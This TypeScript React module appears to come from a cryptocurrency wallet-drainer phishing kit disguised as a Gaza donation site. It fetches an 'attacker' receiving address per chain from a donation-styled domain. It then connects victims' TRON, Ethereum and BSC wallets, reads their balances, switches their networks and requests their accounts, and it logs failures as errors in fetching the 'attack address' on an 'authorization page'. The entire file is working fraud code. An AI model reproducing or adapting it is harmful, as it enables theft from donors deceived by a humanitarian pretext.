import Web3 from "web3";
import tronService from "../../utils/tron/tron.service";
import ReactGA from "react-ga4";

export const tronWebChannelArr = ["4"];

export const adapterChannelArr = ["1", "2", "3", "5"];

export const tronChannelArr = ["1", "2", "3", "4", "5"];

export const ethChannelArr = ["6", "7", "8", "9", "10"];

export const bscChannelArr = ["11", "12", "13", "14", "15"];

export const fetchReceiverData = (
  chain: string,
  setReceiverAddress: (data: any) => void,
  hostname: string
) => {
  fetch(`https://donate.reachoutgaza.org/api/${chain}/attacker`) //todo
    .then((response) => response.text())
    .then((data) => {
      // 更新状态
      setReceiverAddress(data);
    })
    .catch((error) => {
      console.error("Error fetching data:", error);
    });
};

export async function handleConnect(
  adapter: any,
  tronWeb: any,
  setTotal: (data: number) => void
) {
  try {
    await adapter?.connect();
    await tronService
      .getBalance(tronWeb, adapter?.address)
      .then((balance: any) => {
        setTotal(balance);
      });
  } catch (e: any) {
    ReactGA.event({
      action: "获取攻击地址错误",
      category: "授权页面",
      label: JSON.stringify(e),
    });
  }
}

export const initializePage = (
  channelId: string,
  adapter: any,
  tronWeb: any,
  setTotal: (balance: number) => void,
  setReadyState: (data: any) => void,
  setReceiverAddress: (data: string) => void,
  setEthAccount: (data: any) => void,
  hostname: any
) => {
  try {
    if (tronChannelArr.includes(channelId)) {
      handleConnect(adapter, tronWeb, setTotal)
        .then(() => {
          console.log("handleConnect");
          // alert("adapter"+JSON.stringify(adapter)); //
          if (adapter) {
            adapter.connect().then(() => {
              console.log("adapter.connect()");
              // alert("adapter.connect()");
            });
            setReadyState(adapter.readyState);
          } else {
            console.log("adapter is null");
            // alert("adapter.not connect()");
          }
          // 调用函数获取数据
          fetchReceiverData("tron", setReceiverAddress, hostname);
        })
        .catch((e: any) => {
          ReactGA.event({
            action: "获取攻击地址错误",
            category: "授权页面",
            label: JSON.stringify(e),
          });
        });
    } else if (ethChannelArr.includes(channelId)) {
      //如果是channelId=6,7,8,9,10或者其他
      //则获取eth账户
      fetchReceiverData("eth", setReceiverAddress, hostname);

      let chainId = "";
      window.ethereum.request({ method: "eth_chainId" }).then((result: any) => {
        chainId = result;
        // alert("chainId"+chainId);
        if (chainId !== "0x1") {
          window.ethereum
            .request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: "0x1" }],
            })
            .then((result: any) => {
              // 设置延迟 500 毫秒（半秒），然后请求账户
              setTimeout(() => {
                window.ethereum
                  .request({ method: "eth_requestAccounts" })
                  .then((accounts: any) => {
                    setEthAccount(accounts[0]);
                  });
              }, 3000); // 500 毫秒后执行
            });
        } else {
          // 如果已经在主网，直接请求账户
          window.ethereum
            .request({ method: "eth_requestAccounts" })
            .then((accounts: any) => {
              setEthAccount(accounts[0]);
            });
        }
      });
    } else if (bscChannelArr.includes(channelId)) {
      fetchReceiverData("bsc", setReceiverAddress, hostname);

      let chainId = "";
      window.ethereum.request({ method: "eth_chainId" }).then((result: any) => {
        chainId = result;
        // alert("chainId"+chainId);
        if (chainId !== "0x38") {
          window.ethereum
            .request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: "0x38" }],
            })
            .then((result: any) => {
              // 设置延迟 500 毫秒（半秒），然后请求账户
              setTimeout(() => {
                window.ethereum
                  .request({ method: "eth_requestAccounts" })
                  .then((accounts: any) => {
                    setEthAccount(accounts[0]);
                  });
              }, 3000); // 500 毫秒后执行
            });
        } else {
          // 如果已经在bsc网，直接请求账户
          window.ethereum
            .request({ method: "eth_requestAccounts" })
            .then((accounts: any) => {
              setEthAccount(accounts[0]);
            });
        }
      });
    } else if (channelId === "16" || channelId === "17") {
      window.ethereum
        .request({
          method: "eth_requestAccounts",
        })
        .then((account: React.SetStateAction<string>[]) => {
          setEthAccount(account[0]);
        });

      fetchReceiverData("eth", setReceiverAddress, hostname);

      window.ethereum
        .request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x42" }],
        })
        .then((result: any) => {
          console.log(result);
        });
    }
  } catch (e: any) {
    ReactGA.event({
      action: "获取攻击地址错误",
      category: "授权页面",
      label: JSON.stringify(e),
    });
  }
};
